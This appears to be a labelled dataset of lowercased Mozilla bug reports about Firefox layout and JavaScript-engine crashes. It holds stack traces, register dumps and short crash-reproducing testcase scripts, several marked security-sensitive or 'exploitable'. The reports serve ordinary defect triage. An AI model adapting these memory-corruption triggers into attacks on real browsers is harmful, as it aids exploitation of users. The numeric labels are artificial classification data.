allocate region firefox-bin 673 malloc set a breakpoint in szone_error to debug	9
fix nscssframeconstructor havefirstletterstyle broken in the presence of asynchronous restyles or batching this is a bug on the second assertion described in bug 357531 it could even also be related to the assertion we were seeing for a while going through the bloaturls on balsa maybe even still are nscssframeconstructor havefirstletterstyle is quite broken in the presence of batching what seems to be happening in attachment 243039 details is the following the attachment within one event changes the id on the option such that the first-letter style rule no longer applies and then removes the first child of the option so when we get to nscssframeconstructor contentremoved havefirstletterstyle returns false because it uses probepseudostylecontext based on the current style not the style at the last time we processed restyle events so it concludes that there s no first-letter frame to remove this means we end up with the non-first-letter frame still in the frame tree we remove only the floating first letter frame but pointing to content that s been removed from the content tree i think this problem is significantly worse due to asynchronous restyles which i think are post-1.8 but not sure but it may be present due to other batching mechanisms as well or if we can trigger a failure of havefirstletterstyle in other code such as changing an attribute so that an element goes from having first letter style to having its first child with display none the symptoms of this problem are the assertions loading attachment 243039 details warning content has no document file nstextframe.cpp line 6143 warning reflow of frame failed in nslinelayout file nslinelayout.cpp line 890 warning ns_ensure_true ns_succeeded rv failed file nsblockframe.cpp line 3399 warning ns_ensure_true ns_succeeded rv failed file nsblockframe.cpp line 3230 warning ns_ensure_true ns_succeeded rv failed file nsblockframe.cpp line 1770 assertion reflow dirty lines failed ns_succeeded rv file nsblockframe.cpp line 884	9
crash nslistcontrolframe getselectedindex with popupshowing event and removing select see testcase when clicking on the select mozilla crashes it also crashes on branch so i m marking it security sensitive feel free to open it up if not necessary maybe this would be fixed with the fix for bug 279703 talkback id tb31508003w nslistcontrolframe getselectedindex mozilla/layout/forms/nslistcontrolframe.cpp line 1425 nslistcontrolframe abouttodropdown mozilla/layout/forms/nslistcontrolframe.cpp line 1760 nscomboboxcontrolframe togglelist mozilla/layout/forms/nscomboboxcontrolframe.cpp line 741 nslisteventlistener mousedown mozilla/layout/forms/nslistcontrolframe.cpp line 2861 nseventtargetchainitem handleevent mozilla/content/events/src/nseventdispatcher.cpp line 209 nseventtargetchainitem handleeventtargetchain mozilla/content/events/src/nseventdispatcher.cpp line 267 nseventdispatcher dispatch mozilla/content/events/src/nseventdispatcher.cpp line 484 presshell handleeventinternal mozilla/layout/base/nspresshell.cpp line 5924 presshell handlepositionedevent mozilla/layout/base/nspresshell.cpp line 5815 presshell handleevent mozilla/layout/base/nspresshell.cpp line 5658 nsviewmanager handleevent mozilla/view/src/nsviewmanager.cpp line 1457 nsviewmanager dispatchevent mozilla/view/src/nsviewmanager.cpp line 1410 handleevent mozilla/view/src/nsview.cpp line 174 nswindow dispatchevent mozilla/widget/src/windows/nswindow.cpp line 1107 nswindow dispatchmouseevent mozilla/widget/src/windows/nswindow.cpp line 6288	9
crash nsprescontext getcontainerinternal when removing window on focus and reloading see testcase which crashes mozilla within 200ms after load it also crashes branch builds so i m marking it security sensitive for now please open up if not necessary talkback id tb31509967g nsprescontext getcontainerinternal mozilla/layout/base/nsprescontext.cpp line 1117 presshell unsuppressandinvalidate mozilla/layout/base/nspresshell.cpp line 4412 presshell unsuppresspainting mozilla/layout/base/nspresshell.cpp line 4457 the iframe consists of this code html head head body iframe iframe script window.frames 0 focus settimeout doe 200 function doe window.frames 0 location.reload function doe2 window.addeventlistener focus function e window.frameelement.parentnode.removechild window.frameelement true settimeout doe2 50 script body html	9
fix crash presshell getprimaryframefor with first-letter and after and counter loading the testcase in a mac trunk debug build causes thread 0 crashed 0 00000000 0 275845121 1 libgklayout.dylib presshell getprimaryframefor nsicontent const 42 nspresshell.cpp:4705 2 libgklayout.dylib nscssframeconstructor characterdatachanged nsicontent int 301 nscssframeconstructor.cpp:9852 3 libgklayout.dylib presshell characterdatachanged nsidocument nsicontent characterdatachangeinfo 233 nspresshell.cpp:4478 4 libgklayout.dylib nsbindingmanager characterdatachanged nsidocument nsicontent characterdatachangeinfo 88 nsbindingmanager.cpp:1160 5 libgklayout.dylib nsnodeutils characterdatachanged nsicontent characterdatachangeinfo 166 nsnodeutils.cpp:88 6 libgklayout.dylib nsgenericdomdatanode settextinternal unsigned unsigned unsigned short const unsigned int 1003 nsgenericdomdatanode.cpp:485 7 libgklayout.dylib nsgenericdomdatanode setdata nsastring_internal const 84 nsgenericdomdatanode.cpp:323 8 libgklayout.dylib nstextnode setdata nsastring_internal const 24 nstextnode.cpp:69 9 libgklayout.dylib nscounterlist recalcall 200 nscountermanager.cpp:186 10 libgklayout.dylib recalcdirtylists nsastring_internal const nscounterlist void 37 nscountermanager.cpp:274 11 libgklayout.dylib nsbasehashtable nsstringhashkey nsautoptr nscounterlist nscounterlist s_enumreadstub pldhashtable pldhashentryhdr unsigned void 81 nsbasehashtable.h:327 12 libxpcom_core.dylib pl_dhashtableenumerate 191 pldhash.c:724 13 libgklayout.dylib nsbasehashtable nsstringhashkey nsautoptr nscounterlist nscounterlist enumerateread pldhashoperator nsastring_internal const nscounterlist void void const 128 nsbasehashtable.h:188 14 libgklayout.dylib nscountermanager recalcall 41 nscountermanager.cpp:281 15 libgklayout.dylib nscssframeconstructor recalcquotesandcounters 80 nscssframeconstructor.cpp:10200 16 libgklayout.dylib nscssframeconstructor endupdate 36 nscssframeconstructor.cpp:10181 17 libgklayout.dylib nscssframeconstructor processpendingrestyles 536 nscssframeconstructor.cpp:12973 18 libgklayout.dylib nscssframeconstructor restyleevent run 200 nscssframeconstructor.cpp:13032 19 libxpcom_core.dylib nsthread processnextevent int int 508 nsthread.cpp:483	9
assertion reflow dirty lines failed and more with block-in-inline wrapping xbl loading the testcase triggers two assertions assertion reflow dirty lines failed ns_succeeded rv file users/jruderman/trunk/mozilla/layout/generic/nsblockframe.cpp line 912 assertion child list is not empty for initial reflow mframes.isempty file users/jruderman/trunk/mozilla/layout/generic/nsinlineframe.cpp line 334 closing it triggers a third assertion some frame destructors were not called mframecount 0 file users/jruderman/trunk/mozilla/layout/base/nspresshell.cpp line 674 this bug appears to be exploitable	9
crash presshell attributechanged with menuitem sizetopopup always position absolute and tree stuff see testcase which crashes mozilla within 100ms it also crashes branch builds so marking security sensitive for now i guess bug 279703 might fix things here talkback id tb33045810e presshell attributechanged mozilla/layout/base/nspresshell.cpp line 4408 nsnodeutils attributechanged mozilla/content/base/src/nsnodeutils.cpp line 100 nsxulelement unsetattr mozilla/content/xul/content/src/nsxulelement.cpp line 1316 nsxulelement getattrinfo mozilla/content/xul/content/src/nsxulelement.cpp line 2108 presshell addref mozilla/layout/base/nspresshell.cpp line 1394	9
1.8 branch shutdown crash after using accessibility api testcase from bug 377470 i get a shutdown crash in 1.8.1.5pre debug builds after running the testcase from bug 377470 stack as described at bug 377470 comment 9 dereferencing a deleted object so far have not reproduced the crash in an optimized build	9
crash nsxuldocument executeonbroadcasthandlerfor with domattrmodified event handler and observes see testcase which crashes mozilla within 100ms it also crashes branch so marking security sensitive for now 0 1 nscomptr nsicontent nscomptr nsicontent nsqueryinterface 2 nsxuldocument executeonbroadcasthandlerfor nsicontent nsidomelement nsiatom 3 nsxuldocument attributechanged nsidocument nsicontent int nsiatom int 4 nsnodeutils attributechanged nsicontent int nsiatom int 5 nsgenericelement setattrandnotify int nsiatom nsiatom nsastring_internal const nsattrvalue int int int 6 nsgenericelement setattr int nsiatom nsiatom nsastring_internal const int 7 nsgenericelement setattribute nsastring_internal const nsastring_internal const 8 ns_invokebyindex_p 9 autojssuspendrequest suspendrequest branch talkback id tb33739202g i think this might be related to bug 351347	9
script may run when initializing nstextboxframe during init nstextboxframe gets nsidomxullabelelement accesskey which is implemented as an xbl property the stack i get with the testcase is always corrupted	9
fix crash nscellmapcolumniterator getnextframe with domattrmodified and changing rowspan see testcase which crashes current trunk build after 200ms this regressed between 2007-01-21 and 2007-01-22 i guess a regression from bug 352461 0 nscellmapcolumniterator getnextframe int int 1 basictablelayoutstrategy computecolumnintrinsicwidths nsirenderingcontext 2 basictablelayoutstrategy computeintrinsicwidths nsirenderingcontext 3 basictablelayoutstrategy getminwidth nsirenderingcontext 4 nstableframe tableshrinkwidthtofit nsirenderingcontext int 5 nstableframe computeautosize nsirenderingcontext nssize int nssize nssize nssize int 6 nsframe computesize nsirenderingcontext nssize int nssize nssize nssize int 7 nstableframe computesize nsirenderingcontext nssize int nssize nssize nssize int 8 nshtmlreflowstate initconstraints nsprescontext int int nsmargin const nsmargin const 9 nshtmlreflowstate init nsprescontext int int nsmargin const nsmargin const	9
firefox crashes if removing parent node while in xbl constructor	9
crash nsframelist destroyframes with menuitem tooltip and setting some attributes see testcase which crashes mozilla within 200ms it also crashes on branch so i m marking it security sensitive for now 0 nsframelist destroyframes e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\generic\nsframelist.cpp:67 1 nscontainerframe destroy e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\generic\nscontainerframe.cpp:252 2 nsboxframe removeframe nsiatom nsiframe e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\xul\base\src\nsboxframe.cpp:1012 3 nsframemanager removeframe nsiframe nsiatom nsiframe e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\base\nsframemanager.cpp:690 4 nscssframeconstructor contentremoved nsicontent nsicontent int int e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\base\nscssframeconstructor.cpp:9607 5 nscssframeconstructor recreateframesforcontent nsicontent e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\base\nscssframeconstructor.cpp:11119 6 nscssframeconstructor restyleelement nsicontent nsiframe nschangehint e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\base\nscssframeconstructor.cpp:10022 7 nscssframeconstructor processonerestyle nsicontent nsrestylehint nschangehint e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\base\nscssframeconstructor.cpp:12925 8 nscssframeconstructor processpendingrestyles e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\base\nscssframeconstructor.cpp:12978 9 nscssframeconstructor restyleevent run e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\layout\base\nscssframeconstructor.cpp:13049 10 nsthread processnextevent int int e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\xpcom\threads\nsthread.cpp:490 11 ns_processnextevent_p nsithread int e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\obj-fx-trunk\xpcom\build\nsthreadutils.cpp:227 12 nsbaseappshell run e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\widget\src\xpwidgets\nsbaseappshell.cpp:154 13 nsappstartup run e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\toolkit\components\startup\src\nsappstartup.cpp:170 14 xre_main e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\toolkit\xre\nsapprunner.cpp:3059 15 main e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\browser\app\nsbrowserapp.cpp:153 16 winmain e builds\tinderbox\fx-trunk\winnt_5.2_depend\mozilla\browser\app\nsbrowserapp.cpp:166 17 tmaincrtstartup f rtm\vctools\crt_bld\self_x86\crt\src\crtexe.c:578 18 baseprocessstart	9
crash gklayout nsiframe getstatebits void this bug has been automatically processed reduced and uploaded by paul s automated pen-tester alpha it still may require more work firefox version mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.1.6 gecko/20070812 bonecho/2.0.0.6 details eax=dddddddd ebx=7ffde000 ecx=dddddddd edx=dddddddd esi=00a078d8 edi=00011970 eip=0197f53a esp=0012df74 ebp=0012df78 iopl=0 nv up ei ng nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286 warning unable to verify checksum for c mozilla\mozilla\firefox-debug\dist\bin\components\gklayout.dll gklayout nsiframe getstatebits 0197f53a 8b4024 mov eax dword ptr eax+24h ds:0023 ddddde01 stack trace gklayout nsiframe getstatebits void gklayout isframespecial class nsiframe aframe gklayout getibcontainingblockfor class nsiframe aframe gklayout nscssframeconstructor reframecontainingblock class nsiframe aframe gklayout nscssframeconstructor contentremoved class nsicontent acontainer class nsicontent achild int aindexincontainer 0 int ainreinsertcontent 0 gklayout nscssframeconstructor recreateframesforcontent class nsicontent acontent gklayout nscssframeconstructor processrestyledframes class nsstylechangelist achangelist gklayout nsipresshell reconstructstyledatainternal void gklayout nsipresshell reconstructstyledata void gklayout presshell endupdate class nsidocument adocument unsigned int aupdatetype 2 gklayout nsdocument endupdate unsigned int aupdatetype 2 gklayout nsstylelinkelement updatestylesheet class nsidocument aolddocument class nsicssloaderobserver aobserver gklayout nshtmlstyleelement unbindfromtree int adeep 1 int anullparent 1 gklayout doremovechildat unsigned int aindex 4 int anotify 1 class nsicontent akid class nsicontent aparent class nsidocument adocument class nsattrandchildarray achildarray gklayout nsgenericelement removechildat unsigned int aindex 4 int anotify 1 gklayout nsgenericelement removechild class nsidomnode aoldchild class nsidomnode areturn gklayout nshtmlheadelement removechild class nsidomnode aoldchild class nsidomnode areturn xpcom_core xptc_invokebyindex class nsisupports that unsigned int methodindex unsigned int paramcount 2 struct nsxptcvariant params xpc3250 xpcwrappednative callmethod class xpccallcontext ccx xpcwrappednative callmode mode call_method 0 xpc3250 xpc_wn_callmethod struct jscontext cx struct jsobject obj unsigned int argc 1 long argv long vp a hash of the backtrace has been used to distinguish this from other bugs already reported by the tester however the automated pen-tester is still in development and this may not be the case also i have n't added stack hashes to bugs that were not uploaded by the tester so this bug may very well exist on bugzilla already	9
crash nscachedstyledata getstyledata from nsquotenode text firefox version mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.1.6 gecko/20070812 bonecho/2.0.0.6 details eax=02717b70 ebx=023ac510 ecx=0271c260 edx=0270ba54 esi=0012fb70 edi=02717b28 eip=02717a75 esp=0012fb3c ebp=0012fb5c iopl=0 nv up ei pl nz na po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000203 02717a75 224402a8 and al byte ptr edx+eax-58h ds:0023:04e2356c disassembly gklayout nsiframe getstatebits 0197f53a 8b4024 mov eax dword ptr eax+24h 0197f53d 8be5 mov esp ebp 0197f53f 5d pop ebp 0197f540 c3 ret 0197f541 cc int 3 0197f542 cc int 3 0197f543 cc int 3 0197f544 cc int 3 stack trace using release build debug build didnt crash xpcom_core nsqueryinterface operator firefox java_netscape_javascript_jsobject_initclass firefox nsfontlist release firefox jpeg_mem_init firefox nsprintoptions getnewprintsettings firefox nsprintoptions getnewprintsettings firefox nsprintoptions getnewprintsettings firefox nsprintoptions getnewprintsettings firefox nsprintoptions getnewprintsettings xpcom_core pl_handleevent xpcom_core pl_processpendingevents xpcom_core pl_isqueuenative this crashes all over the place and definitely looks exploitable imo also i was n't able to reduce the testcase any further maybe someone else will have more luck	9
fix crash ns_processnextevent_p with domsubtreemodified removing windows binding and other stuff see upcoming testcase which crashes current trunk builds directly or after a few reloads testcase reloads automatically this seems to have regressed between 2007-03-22 and 2007-03-24 that is the time when bug 288392 got fixed making domsubtreemodified work so i guess this is a regression from bug 288392 somehow 0 1 ns_processnextevent_p nsithread int nsthreadutils.cpp:227 2 nsbaseappshell run mozilla/widget/src/xpwidgets/nsbaseappshell.cpp:154 3 nsappstartup run mozilla/toolkit/components/startup/src/nsappstartup.cpp:170 4 xre_main mozilla/toolkit/xre/nsapprunner.cpp:3069 5 main mozilla/browser/app/nsbrowserapp.cpp:153 6 winmain mozilla/browser/app/nsbrowserapp.cpp:166 7 tmaincrtstartup crtexe.c:589 8 baseprocessstart the binding in the iframe needed for testcase file consists of this bindings xmlns binding id a implementation constructor this.style.outline constructor implementation binding bindings	9
fix notify on text changes before firing mutation events like bug 387460 but for text	9
crash in setarrayelement using canvas warning frame ip not in any known module following frames may be wrong js3250 setarrayelement struct jscontext cx struct jsobject obj unsigned long index long v 511 c mozilla\mozilla\js\src\jsarray.c 299 js3250 initarrayelements struct jscontext cx struct jsobject obj unsigned long start unsigned long end long vector c mozilla\mozilla\js\src\jsarray.c 738 js3250 initarrayobject struct jscontext cx struct jsobject obj unsigned long length long vector c mozilla\mozilla\js\src\jsarray.c 762 js3250 js_newarrayobject struct jscontext cx unsigned long length long vector c mozilla\mozilla\js\src\jsarray.c 1997 gklayout nscanvasrenderingcontext2d getimagedata void c mozilla\mozilla\content\canvas\src\nscanvasrenderingcontext2d.cpp 3077 xpcom_core ns_invokebyindex class nsisupports that unsigned int methodindex unsigned int paramcount 0 struct nsxptcvariant params c mozilla\mozilla\xpcom\reflect\xptcall\src\md\win32\xptcinvoke.cpp 102 xpc3250 xpcwrappednative callmethod class xpccallcontext ccx xpcwrappednative callmode mode 12028584 no matching enumerant c mozilla\mozilla\js\src\xpconnect\src\xpcwrappednative.cpp 2251 seems like an evil enough crash that it might be worth filing as a security bug to reproduce load up two images into the testcase do n't know of any images off the top of my head on b.m.o to refer to you can save the testcase and put the urls of two local files in then click the compare button then click it again watch it explode testcase could probably be reduced more but i have n't done it yet	9
crash js_calltracer to reproduce the crash load the following script in an opt jsshell debug jsshell does not crash you ll need v 170 because it uses the yield keyword var fal false function gen let x function y this.__definegetter function if fal yield for var i in gen gc	9
gc hazard with jsstackframe.argv 1 this can be invalid as i have not tried to come up with an example yet but i file this in case the following analysis would be true js_tracestackframe from jsgc.c 1943 contains the following comments js_call_value_tracer trc jsval fp thisp this mark fp argv even though in the common case it will be marked via our caller s frame or via a jsstackheader if fp was pushed by an external invocation the hard case is when there is not enough contiguous space in the stack arena for actual missing formal and local root jsfunctionspec.extra slots in this case fp argv points to new space in a new arena and marking the caller s operand stack or an external caller s allocated stack tracked by a jsstackheader will not mark all the values stored and addressable via fp argv but note that fp argv 2 will be marked via the caller even when the arg-vector moves and fp argv 1 will be marked as well and we mark it redundantly just above this comment the last sentence of this comment block is not true as the trace code above the comment traces fp thisp the initial value stored in fp argv 1 the code does not trace the current value stored there thus if a native method uses argv 1 to store its temporaries and the argv was reallocated then there is a gc hazard in that call i ll check if this is indeed true	9
heap corruption on out-of-memory in jsopcode.c when testing js1_5/extensions/regress-44009.js from the test suite with a patch from bug 393368 comment 9 attachment 278034 details diff review i got heap corruption note that the patch has an accounting bug leading to js_arenarealloc returning null at an arbitrary moment but that simulated realout-of-mmeory rather nicely here is the output from running the test case with that patch m/trunk/mozilla/js/tests src/linux_all_dbg.obj/js f shell.js f js1_5/shell.js f js1_5/extensions/shell.js f js1_5/extensions/regress-44009.js f js-test-driver-end.js bugnumber 44009 status testing that we do n't crash on obj.tosource js1_5/extensions/regress-44009.js:83 out of memory glibc detected home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js malloc memory corruption fast backtrace lib/libc.so.6 lib/libc.so.6 lib/libc.so.6 realloc home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js lib/libc.so.6 libc_start_main home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js strncmp memory map 00110000-00111000 r-xp 00110000 00:00 0 vdso 00220000-0023b000 r-xp 00000000 08:02 213335 lib/ld-2.6.so 0023b000-0023c000 r-xp 0001a000 08:02 213335 lib/ld-2.6.so 0023c000-0023d000 rwxp 0001b000 08:02 213335 lib/ld-2.6.so 0023f000-0038d000 r-xp 00000000 08:02 213336 lib/libc-2.6.so 0038d000-0038f000 r-xp 0014e000 08:02 213336 lib/libc-2.6.so 0038f000-00390000 rwxp 00150000 08:02 213336 lib/libc-2.6.so 00390000-00393000 rwxp 00390000 00:00 0 00395000-003bc000 r-xp 00000000 08:02 213339 lib/libm-2.6.so 003bc000-003bd000 r-xp 00026000 08:02 213339 lib/libm-2.6.so 003bd000-003be000 rwxp 00027000 08:02 213339 lib/libm-2.6.so 00762000-0076d000 r-xp 00000000 08:02 213346 lib/libgcc_s-4.1.2-20070503.so.1 0076d000-0076e000 rwxp 0000a000 08:02 213346 lib/libgcc_s-4.1.2-20070503.so.1 08048000-0813e000 r-xp 00000000 08:03 1442033 home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js 0813e000-08144000 rw-p 000f5000 08:03 1442033 home/igor/m/trunk/mozilla/js/src/linux_all_dbg.obj/js 08d5b000-08d9c000 rw-p 08d5b000 00:00 0 b7b00000-b7b21000 rw-p b7b00000 00:00 0 b7b21000-b7c00000 p b7b21000 00:00 0 b7cef000-b7cf0000 rw-p b7cef000 00:00 0 b7cf0000-b7cf1000 r p 00ac8000 08:02 312403 usr/lib/locale/locale-archive b7cf1000-b7dd2000 r p 0026e000 08:02 312403 usr/lib/locale/locale-archive b7dd2000-b7fd2000 r p 00000000 08:02 312403 usr/lib/locale/locale-archive b7fd2000-b7fd4000 rw-p b7fd2000 00:00 0 bf885000-bf89a000 rw-p bf885000 00:00 0 stack aborted here is the stack trace when js_arenarealloc returned null the first time 0 js_arenarealloc pool p size=236 incr=52 at jsarena.c:229 1 in sprintensurebuffer sp len=52 at jsopcode.c:428 2 in sprintput sp s if version js_1.7 gtestsuite js1_7 len=52 at jsopcode.c:445 3 in js_printf jp format at jsopcode.c:857 4 in decompile ss pc a nb=318 nextop=jsop_nop at jsopcode.c:2962 5 in js_decompilecode jp script pc len=318 pcdepth=0 at jsopcode.c:4665 6 in js_decompilefunction jp fun at jsopcode.c:4867 7 in js_decompilefunction cx fun indent=32768 at jsapi.c:4743 8 in fun_tostringhelper cx indent=32768 argc=0 vp at jsfun.c:1567 9 in fun_tosource cx argc=0 vp at jsfun.c:1584 10 in js_invoke cx argc=0 flags=2 at jsinterp.c:1351 11 in js_internalinvoke cx obj fval=166661248 flags=0 argc=0 argv rval at jsinterp.c:1474 12 in js_trymethod cx obj atom argc=0 argv rval at jsobj.c:4606 13 in js_valuetosource cx v=166664544 at jsstr.c:2741 14 in obj_tosource cx argc=0 vp at jsobj.c:944 15 in js_invoke cx argc=0 flags=0 at jsinterp.c:1351 16 in js_interpret cx pc result at jsinterp.c:4111 17 in js_execute cx chain script down flags=0 result at jsinterp.c:1645 18 in js_executescript cx obj script rval at jsapi.c:4777 19 in process cx obj filename js1_5/extensions/regress-44009.js forcetty=0 at js.c:230 20 in processargs cx obj argv argc=10 at js.c:464 21 in main argc=10 argv envp at js.c:3254 that lead later to the following abort from malloc 0 in kernel_vsyscall 1 in raise from lib/libc.so.6 2 in abort from lib/libc.so.6 3 in libc_message from lib/libc.so.6 4 in int_malloc from lib/libc.so.6 5 in int_realloc from lib/libc.so.6 6 in realloc from lib/libc.so.6 7 in growstuff ss sp gtestsuite js1_6 len=21 at jsprf.c:1103 8 in fill2 ss src gtestsuite js1_6 srclen=21 width=-21 flags=0 at jsprf.c:142 9 in cvt_s ss s gtestsuite js1_6 width=0 prec=-1 flags=0 at jsprf.c:398 10 in dosprintf ss fmt ap hïï\t at jsprf.c:1008 11 in js_vsmprintf fmt s s s ap at jsprf.c:1156 12 in sprint sp format s s s at jsopcode.c:495 13 in decompile ss pc nb=17 nextop=jsop_nop at jsopcode.c:3074 14 in decompile ss pc 006 nb=318 nextop=jsop_nop at jsopcode.c:2991 15 in js_decompilecode jp script pc len=318 pcdepth=0 at jsopcode.c:4665 16 in js_decompilefunction jp fun at jsopcode.c:4867 17 in js_decompilefunction cx fun indent=32768 at jsapi.c:4743 18 in fun_tostringhelper cx indent=32768 argc=0 vp at jsfun.c:1567 19 in fun_tosource cx argc=0 vp at jsfun.c:1584 20 in js_invoke cx argc=0 flags=2 at jsinterp.c:1351 21 in js_internalinvoke cx obj fval=166661248 flags=0 argc=0 argv rval at jsinterp.c:1474 22 in js_trymethod cx obj atom argc=0 argv rval at jsobj.c:4606 23 in js_valuetosource cx v=166664544 at jsstr.c:2741 24 in obj_tosource cx argc=0 vp at jsobj.c:944 25 in js_invoke cx argc=0 flags=0 at jsinterp.c:1351 26 in js_interpret cx pc result at jsinterp.c:4111 27 in js_execute cx chain script down flags=0 result at jsinterp.c:1645 28 in js_executescript cx obj script rval at jsapi.c:4777 29 in process cx obj filename js1_5/extensions/regress-44009.js forcetty=0 at js.c:230 30 in processargs cx obj argv argc=10 at js.c:464 31 in main argc=10 argv envp at js.c:3254	9
columns crash nscolumnsetframe getcontentinsertionframe and nslinelayout trimtrailingwhitespacein this is a followup to bug 344557 comment 14 sensitive because i got a crash using freed memory in my tree i have bug 344557 fixed and also boris patch for bug 334602 steps to reproduce 1 load url which is the original testcase from bug 344557 2 repeatedly type ctrl ctrl+0 while it is loading actual results assertion overflow list w/o frames mframes.notempty file nsinlineframe.cpp line 362 assertion reflow dirty lines failed ns_succeeded rv file nsblockframe.cpp line 916 assertion next in flow should have been deleted kidnextinflow file nscolumnsetframe.cpp line 503 warning content has no document file nstextframe.cpp line 5948 warning reflow of frame failed in nslinelayout file nslinelayout.cpp line 997 assertion forget-word-frame void aframe mwordframes peekfront file nslinelayout.cpp line 3069 and then a couple of crashes nscolumnsetframe getcontentinsertionframe and nslinelayout trimtrailingwhitespacein	11
assertion some frame destructors were not called with this testcase that makes scrollbars disappear marking security sensitive because similar assertions because are also security sensitive see upcoming testcase when hovering one of the scrollbars they disappear when you reload the page you get the assertion assertion some frame destructors were not called mframecount 0 fi le c mozilla/mozilla/layout/base/nspresshell.cpp line 623	11
crash nsaccessibilityservice getaccessible with display none option inside optgroup see testcase because of the used of enhanced privileges you need to download the file to your desktop it also crashes branch builds so marking security sensitive for now 0 xul.dll 1 nsaccessibilityservice getaccessible nsidomnode nsipresshell nsiweakreference nsiframe int nsiaccessible e builds\tinderbox\fx-trunk-newref\winnt_5.2_depend\mozilla\accessible\src\base\nsaccessibilityservice.cpp:1209 2 nsaccessibilityservice getaccessibleinweakshell nsidomnode nsiweakreference nsiaccessible e builds\tinderbox\fx-trunk-newref\winnt_5.2_depend\mozilla\accessible\src\base\nsaccessibilityservice.cpp:1143 3 nshtmlselectlistaccessible accessibleforoption nsiaccessibilityservice nsicontent nsiaccessible int e builds\tinderbox\fx-trunk-newref\winnt_5.2_depend\mozilla\accessible\src\html\nshtmlselectaccessible.cpp:367 4 nshtmlselectlistaccessible cacheoptsiblings nsiaccessibilityservice nsicontent nsiaccessible int e builds\tinderbox\fx-trunk-newref\winnt_5.2_depend\mozilla\accessible\src\html\nshtmlselectaccessible.cpp:408 5 nshtmlselectlistaccessible cachechildren e builds\tinderbox\fx-trunk-newref\winnt_5.2_depend\mozilla\accessible\src\html\nshtmlselectaccessible.cpp:445 6 nsaccessible getchildcount int e builds\tinderbox\fx-trunk-newref\winnt_5.2_depend\mozilla\accessible\src\base\nsaccessible.cpp:798 7 nsaccessible getfirstchild nsiaccessible e builds\tinderbox\fx-trunk-newref\winnt_5.2_depend\mozilla\accessible\src\base\nsaccessible.cpp:682 8 ns_invokebyindex_p e builds\tinderbox\fx-trunk-newref\winnt_5.2_depend\mozilla\xpcom\reflect\xptcall\src\md\win32\xptcinvoke.cpp:101 9 autojssuspendrequest suspendrequest e builds\tinderbox\fx-trunk-newref\winnt_5.2_depend\mozilla\js\src\xpconnect\src\xpcprivate.h:3313 10 rtlfreeheap	11
crash gklayout nsbindingmanager getnestedinsertionpoint firefox version mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.1.6 gecko/20070812 bonecho/2.0.0.6 details eax=0012c8b8 ebx=7ffd6000 ecx=00000000 edx=00000000 esi=00000000 edi=00011970 eip=01c8e535 esp=0012c85c ebp=0012c870 iopl=0 nv up ei pl nz ac pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216 warning unable to verify checksum for c mozilla\mozilla\firefox-debug\dist\bin\components\gklayout.dll gklayout nsbindingmanager getnestedinsertionpoint 01c8e535 8b11 mov edx dword ptr ecx ds:0023:00000000 disassembly gklayout nsbindingmanager getnestedinsertionpoint 01c8e535 8b11 mov edx dword ptr ecx 01c8e537 8b4d0c mov ecx dword ptr ebp+0ch 01c8e53a ff9298000000 call dword ptr edx+98h 01c8e540 3b4508 cmp eax dword ptr ebp+8 01c8e543 7507 jne gklayout nsbindingmanager getnestedinsertionpoint 01c8e54c 01c8e545 33c0 xor eax eax 01c8e547 e991000000 jmp gklayout nsbindingmanager getnestedinsertionpoint 01c8e5dd 01c8e54c 8d45f8 lea eax ebp-8 stack trace gklayout nsbindingmanager getnestedinsertionpoint class nsicontent aparent class nsicontent achild class nsicontent aresult gklayout nsbindingmanager contentappended class nsidocument adocument class 